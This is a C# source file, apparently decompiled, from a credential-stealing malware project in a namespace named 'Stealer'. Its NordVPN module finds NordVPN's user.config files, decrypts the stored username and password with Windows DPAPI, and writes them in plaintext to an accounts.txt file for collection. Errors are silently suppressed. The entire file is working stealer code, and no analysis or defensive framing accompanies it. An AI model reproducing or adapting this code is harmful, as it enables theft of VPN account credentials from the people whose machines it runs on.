using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Stealer;

internal sealed class NordVPN
{
	private static string Decode(string s)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void Save(string sSavePath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				DirectoryInfo[] directories2 = directoryInfo2.GetDirectories();
				foreach (DirectoryInfo directoryInfo3 in directories2)
				{
					string text = Path.Combine(directoryInfo3.FullName, "user.config");
					if (File.Exists(text))
					{
						Directory.CreateDirectory(sSavePath + "\\" + directoryInfo3.Name);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")!.InnerText;
						string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")!.InnerText;
						if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
						{
							string text2 = Decode(innerText);
							string text3 = Decode(innerText2);
							Counter.VPN++;
							File.AppendAllText(sSavePath + "\\" + directoryInfo3.Name + "\\accounts.txt", "Username: " + text2 + "\nPassword: " + text3 + "\n\n");
						}
					}
				}
			}
		}
		catch
		{
		}
	}
}
